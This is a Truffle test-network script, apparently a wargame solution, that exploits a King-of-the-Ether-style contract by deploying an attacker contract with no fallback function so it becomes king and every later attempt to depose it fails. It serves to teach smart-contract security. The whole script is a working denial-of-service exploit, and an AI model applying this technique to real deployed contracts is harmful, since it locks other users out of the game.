const KingContract = artifacts.require('King')
const KingAttackContract = artifacts.require('KingAttack')
const assert = require('assert')

/**
 * We have a game similar to the notorious King of the Ether (https://www.kingoftheether.com/thrones/kingoftheether/index.html).
 * The vuln can be found on line 16 of King.sol.
 * 
 * We have to become king and prevent anybody else from doing so. That means that we
 * should find a way to stop the execution of the contract every time that someone tries to depose us.
 * 
 * The way to achieve this is to deploy a new contract that will become the new king, but that it does
 * not have a fallback function to receive transfers. Thus, once we become kings, every single time
 * that someone else executes the King.sol contract and reaches line 16, the contract execution will throw
 * an exception and halt (because the transfer cannot be completed).
 * 
 */
async function execute(callback) {
    let victimContract = await KingContract.deployed()
    
    // Deploy attacker contract with some initial ether
    let attackerContract = await KingAttackContract.new({
        from: web3.eth.accounts[1],
        value: web3.toWei(3, 'ether')
    })

    let king = await victimContract.king.call()
    let prize = await victimContract.prize.call()
    assert.equal(king, web3.eth.accounts[0])
    console.log(`The king is ${king}`)
    console.log(`The prize is ${web3.fromWei(prize, 'ether')}`)
    
    await attackerContract.becomeKing(victimContract.address, {
        from: web3.eth.accounts[1],
        value: web3.toWei(0.02, 'ether')
    })

    king = await victimContract.king.call()
    prize = await victimContract.prize.call()
    assert.equal(king, attackerContract.address)
    console.log(`The king is ${king}`)
    console.log(`The prize is ${web3.fromWei(prize, 'ether')}`)

    callback()
}

module.exports = execute
